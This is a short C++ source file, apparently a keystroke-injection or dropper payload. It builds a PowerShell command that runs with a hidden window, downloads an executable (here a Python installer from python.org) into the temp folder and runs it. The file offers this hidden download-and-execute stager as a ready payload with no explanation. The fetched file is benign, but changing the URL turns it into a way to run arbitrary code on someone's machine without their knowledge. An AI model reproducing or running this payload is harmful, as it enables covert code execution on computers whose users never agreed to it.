#include "alt.hpp"

BEGIN()
    const char *str = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"
    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/py_install.exe'); %temp%/py_install.exe";
    RUN_ENTER(str, 0)
END()
